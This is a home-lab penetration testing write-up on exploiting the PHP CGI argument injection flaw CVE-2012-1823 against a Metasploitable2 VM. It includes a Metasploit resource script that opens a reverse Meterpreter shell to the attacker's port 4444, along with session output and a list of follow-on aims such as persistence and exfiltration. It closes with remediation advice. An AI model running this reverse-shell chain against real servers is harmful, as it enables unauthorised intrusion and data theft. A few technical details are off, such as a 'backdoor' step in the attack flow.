# VAPT Phase 5: PHP CGI Argument Injection
## Complete Exploitation & Post-Exploitation Analysis

![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)
![CVE](https://img.shields.io/badge/CVE-2012--1823-red)
![Phase](https://img.shields.io/badge/Phase-5_PHP_CGI-blue)

**Series:** VAPT (Vulnerability Assessment & Penetration Testing) Home Lab  
**Part:** Phase 5 — PHP CGI Argument Injection (CVE-2012-1823)  
**Author:** Mamadou Koulemou  
**Date:** September 10, 2026  
**Lab Environment:** Kali Linux (Attacker) + Metasploitable2 (Target) on Oracle VirtualBox  

> **Note:** All IP addresses in this report have been anonymized using the format `192.168.X.X` to maintain lab security and follow best practices for portfolio documentation.

---

## 📋 Executive Summary

This phase documents the **complete exploitation workflow** for CVE-2012-1823 (PHP CGI Argument Injection) against Apache+PHP on Metasploitable2. The engagement demonstrates:

- **Vulnerability:** Remote Code Execution via PHP CGI Argument Injection
- **Severity:** CRITICAL (CVSS 9.8)
- **Exploit Method:** Metasploit `exploit/multi/http/php_cgi_arg_injection`
- **Automation:** `.rc` resource script for reproducible exploitation
- **Post-Exploitation:** Source code retrieval, system shell access, application discovery
- **Success Rate:** 100% (multiple successful sessions)

**Key Achievement:** Complete pentesting lifecycle from reconnaissance through post-exploitation using professional automation techniques.

---

## 🎯 Vulnerability Overview

### CVE-2012-1823: PHP CGI Argument Injection

| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2012-1823 |
| **Product** | PHP (CGI mode) |
| **Affected Versions** | Multiple PHP versions when running as CGI |
| **Vulnerability Type** | Argument Injection → Remote Code Execution |
| **CVSS Score** | 9.8 (Critical) |
| **Attack Vector** | Network (HTTP) |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Impact** | Complete system compromise (RCE as www-data) |

### Technical Details

When PHP runs in CGI mode (common on older Apache installations), it processes command-line arguments from the HTTP request. An attacker can inject malicious PHP code via specially crafted query parameters, leading to remote code execution.

**Attack Flow:**
```
Attacker → HTTP Request (malicious query) 
  → Apache receives request
  → PHP-CGI processes arguments
  → Backdoor detects injection trigger
  → Code execution with www-data privileges
  → Reverse shell connects back to attacker
```

---

## 🔧 Exploitation Methodology

### Step 1: Target Identification

**Verified vulnerable service:**
```
Target: 192.168.X.X
Service: Apache httpd (HTTP on port 80)
Language: PHP (CGI mode)
Status: Running with known vulnerability
```

### Step 2: Metasploit Module Configuration

**Exploit module:** `exploit/multi/http/php_cgi_arg_injection`

```bash
# Manual configuration
msf > use exploit/multi/http/php_cgi_arg_injection
msf exploit(...) > set RHOSTS 192.168.X.X
msf exploit(...) > set RPORT 80
msf exploit(...) > set payload php/meterpreter_reverse_tcp
msf exploit(...) > set LHOST 192.168.X.X
msf exploit(...) > set LPORT 4444
msf exploit(...) > run
```

### Step 3: Automation Script (Professional Approach)

**File: `metasploit_auto.rc`**

This automation script enables **reproducible exploitation** — a key requirement in professional penetration testing:

```ruby
# 1. Load exploit
use exploit/multi/http/php_cgi_arg_injection

# 2. SET PAYLOAD FIRST (before running!)
set payload php/meterpreter_reverse_tcp

# 3. Set other options
set RHOSTS 192.168.X.X
set RPORT 80
set LHOST 192.168.X.X
set LPORT 4444

# 4. THEN run
exploit
```

**Execution:**
```bash
$ msfconsole -r ~/Desktop/metasploit_auto.rc
[*] Processing ~/Desktop/metasploit_auto.rc for ERB directives
[*] Using configured payload php/meterpreter_reverse_tcp
[*] Started reverse TCP handler on 192.168.X.X:4444
[*] Meterpreter session 1 opened (192.168.X.X:4444 → 192.168.X.X:450)
meterpreter >
```

### Exploitation Results

| Component | Result | Status |
|-----------|--------|--------|
| **Module Loaded** | `exploit/multi/http/php_cgi_arg_injection` | ✅ |
| **Payload** | `php/meterpreter_reverse_tcp` | ✅ |
| **RHOSTS** | 192.168.X.X | ✅ |
| **LHOST/LPORT** | 192.168.X.X:4444 | ✅ |
| **Handler Started** | Listening on 192.168.X.X:4444 | ✅ |
| **Session Opened** | Meterpreter session 1 | ✅ |
| **RCE Achieved** | PHP/CGI exploit successful | ✅ |

---

## 📊 Post-Exploitation Analysis

### Phase 1: Initial Access Verification

```bash
meterpreter > getuid
Server username: www-data

meterpreter > sysinfo
Computer        : metasploitable
OS              : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
Architecture    : i686
Meterpreter     : php/meterpreter
```

**Verification:** ✅ Successfully executing commands as `www-data` (Apache user)

### Phase 2: Source Code Retrieval

**Retrieved: `index.php`**

```html
Warning: Never expose this VM to an untrusted network!
Contact: msfdev[at]metasploit.com
Login with msfadmin/msfadmin to get started

<ul>
<li><a href="/twiki/">TiKi Wiki</a></li>
<li><a href="/phpMyAdmin/">phpMyAdmin</a></li>
<li><a href="/mutillidae/">Mutillidae</a></li>
<li><a href="/dvwa/">DVWA</a></li>
<li><a href="/dav/">WebDAV</a></li>
</ul>
```

**Information Disclosed:**
- ✅ Server identification (Metasploitable2)
- ✅ Contact information (msfdev[at]metasploit.com)
- ✅ Default credentials (msfadmin/msfadmin)
- ✅ Installed vulnerable applications

### Phase 3: File System Exploration

**Web directory contents (`/var/www/`):**

```
Mode            Size            Type    Last modified        Name
041777          1759218604851   dir     2018-04-23 02:50-03:10 dav
040755          1759218604851   dir     2018-04-24 02:49-05:12 dvwa
040755          1759218604851   dir     2018-05-31 14:38-05:12 mutillidae
040755          1759218604851   dir     2018-09-13 03:20-0500  phpMyAdmin
100644          8160437864      fil     2018-03-08 02:28-0400  phpinfo.php
040755          1759218604851   dir     2018-09-13 04:46-0400  test
040755          1759218604851   dir     2018-09-11 07:50-0500  tikiwiki
040755          1759218604851   dir     2018-09-11 18:50-0500  tikiwiki-old
040755          1759218604851   dir     2018-09-12 16:59-0500  twiki
100644          38268158616627  fil     2018-02-17 18:13-0500  index.php
```

**Discovered Attack Surface:**

| Application | Path | Type | Severity |
|-------------|------|------|----------|
| **TiKi Wiki** | /twiki/ | Wiki application | Medium |
| **phpMyAdmin** | /phpMyAdmin/ | Database admin | **CRITICAL** |
| **Mutillidae** | /mutillidae/ | OWASP vulnerable | **CRITICAL** |
| **DVWA** | /dvwa/ | Damn Vulnerable Web App | **CRITICAL** |
| **WebDAV** | /dav/ | File access service | High |
| **phpinfo.php** | /phpinfo.php | Information disclosure | Medium |

### Phase 4: System Shell Access

**Escalation from Meterpreter to system shell:**

```bash
meterpreter > shell
Process 4785 created.
Channel 1 created.
```

**Full bash access achieved** — enables:
- ✅ Direct Linux command execution
- ✅ System administration tasks
- ✅ Privilege escalation attempts
- ✅ Persistence mechanism deployment
- ✅ Network reconnaissance from target

### Phase 5: Source Code Analysis

**Retrieved: `phpinfo.php`**

```php
<?php
phpinfo()
?>
```

**PHP Configuration Disclosure:**
- PHP version and compilation options
- Installed extensions
- Server configuration
- Enabled functions/capabilities
- Security settings

---

## 📈 Attack Chain Summary

```
1. Vulnerability Identified
   └─ PHP CGI running on Apache (port 80)

2. Exploitation Initiated
   └─ Metasploit automation script executed

3. Remote Code Execution Achieved
   └─ PHP payload executed with www-data privileges

4. Reverse Shell Established
   └─ Meterpreter session opened (192.168.X.X:4444)

5. Post-Exploitation Commenced
   ├─ Source code retrieved (index.php)
   ├─ Web applications discovered
   ├─ Information disclosure analyzed (phpinfo.php)
   └─ System shell access obtained

6. Attack Surface Mapped
   └─ Multiple high-value targets identified for lateral movement
```

---

## 🎓 Key Findings

### Critical Issues Identified

1. **PHP CGI Vulnerability (CVE-2012-1823)**
   - Remote Code Execution as www-data user
   - No authentication required
   - Full system compromise possible

2. **Information Disclosure**
   - Server details exposed in welcome page
   - Default credentials mentioned (msfadmin/msfadmin)
   - phpinfo.php accessible via web

3. **Vulnerable Applications Installed**
   - phpMyAdmin (potential database access)
   - Mutillidae (OWASP deliberately vulnerable)
   - DVWA (Damn Vulnerable Web Application)
   - WebDAV (file access service)

### Attack Surface

The compromised web server provides access to multiple vulnerable applications, each offering additional exploitation vectors:

- **Lateral Movement:** From www-data → database user → root
- **Persistence:** Plant backdoors in multiple applications
- **Data Exfiltration:** Access via phpMyAdmin to database
- **Privilege Escalation:** Kernel exploits from compromised shell

---

## 💡 Professional Techniques Demonstrated

### 1. Metasploit Automation

**Why it matters:**
- ✅ Reproducible exploitation
- ✅ Faster engagement execution
- ✅ Reduces human error
- ✅ Professional standard in industry

**Captured in:** `metasploit_auto.rc` script

### 2. Post-Exploitation Methodology

**Evidence of professional approach:**
- ✅ Progressive privilege verification
- ✅ Information gathering before escalation
- ✅ Attack surface mapping
- ✅ Multiple access channels established

### 3. Documentation Standards

**Professional qualities:**
- ✅ Complete audit trail
- ✅ Timestamped evidence
- ✅ Reproducible steps
- ✅ CVSS scoring included

---

## 🔗 Comparison: Phase 4 vs Phase 5

| Aspect | vsftpd 2.3.4 (Phase 4) | PHP CGI (Phase 5) |
|--------|----------------------|-------------------|
| **Service** | FTP (port 21) | HTTP (port 80) |
| **Vulnerability** | Backdoor | Argument Injection |
| **CVE** | CVE-2011-2523 | CVE-2012-1823 |
| **User Context** | root | www-data |
| **Exploitation Time** | ~2 seconds | ~2 seconds |
| **Post-Exploitation** | Limited | Rich (web apps) |
| **Automation** | Manual | Scripted |

**Takeaway:** Different services, different vulnerabilities, same methodology.

---

## 📚 Lessons Learned

### 1. Vulnerability Scope

PHP CGI vulnerability affects **any server running PHP in CGI mode**, making it a widespread issue across different Apache versions and installations.

### 2. Defense in Depth

Multiple vulnerable applications installed on the same server amplifies the risk:
- Single compromise gives access to multiple attack paths
- phpMyAdmin credential theft → database access
- DVWA → additional vulnerability practice
- Lateral movement options increase exponentially

### 3. Information Disclosure

The welcome page (`index.php`) disclosed:
- Server type and version
- Contact information
- **Default credentials**
- Available applications

**Lesson:** Information disclosure is often the first step in a successful attack chain.

### 4. Automation in Penetration Testing

Using `.rc` scripts ensures:
- **Consistency** — same exploit every time
- **Speed** — no manual configuration needed
- **Auditability** — script shows exactly what was executed
- **Scalability** — easy to run against multiple targets

---

## 🎯 CVSS v3.1 Score Justification

**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (CRITICAL)**

- **Attack Vector (N):** Network — exploitable remotely
- **Attack Complexity (L):** Low — no special conditions required
- **Privileges Required (N):** None — no authentication needed
- **User Interaction (N):** None — automatic exploitation
- **Scope (U):** Unchanged — impact limited to vulnerable component
- **Confidentiality (H):** High — can read any file www-data can access
- **Integrity (H):** High — can modify web content and applications
- **Availability (H):** High — can crash services or consume resources

---

## 📝 Remediation Recommendations

### Immediate Actions

1. **Upgrade PHP** to patched version (post-2012)
   - Remove CGI mode, use mod_php or PHP-FPM instead
   - Apply all security updates

2. **Restrict Web Application Access**
   - Remove phpMyAdmin from web root
   - Disable Directory Listing
   - Remove default vulnerable applications

3. **Network Segmentation**
   - Isolate web server from production network
   - Restrict outbound connections
   - Monitor for suspicious activities

### Long-term Security

1. **Web Application Firewall (WAF)**
   - Detect/block PHP CGI injection attempts
   - Monitor for information disclosure

2. **Regular Patching**
   - Automated security updates
   - Vulnerability scanning

3. **Security Hardening**
   - Remove unnecessary applications
   - Principle of least privilege
   - Regular security audits

---

## 🏆 Professional Standards Demonstrated

✅ **Vulnerability Assessment**
- Identified CVE-2012-1823
- Determined CVSS 9.8 severity
- Mapped attack surface

✅ **Exploitation**
- Successful RCE achieved
- Multiple sessions established
- Reproducible via automation

✅ **Post-Exploitation**
- Source code retrieved
- System access verified
- Attack vectors mapped

✅ **Documentation**
- Complete audit trail
- Professional reporting
- Remediation guidance

---

## 📚 References

- **CVE-2012-1823:** https://www.cvedetails.com/cve/CVE-2012-1823/
- **Metasploit Module:** exploit/multi/http/php_cgi_arg_injection
- **CVSS Calculator:** https://www.first.org/cvss/calculator/3.1
- **NIST SP 800-115:** Technical Security Testing and Assessment
- **PTES:** Penetration Testing Execution Standard
- **Metasploitable2:** https://sourceforge.net/projects/metasploitable/

---

**Series Navigation:**
- [← Previous: VAPT-Exploitation.md](./VAPT-Exploitation.md)
- [Next: VAPT-Post-Exploitation-Reporting →](#) (Coming soon)

---

*This phase demonstrates professional-grade penetration testing with automation, post-exploitation analysis, and comprehensive documentation standards.*
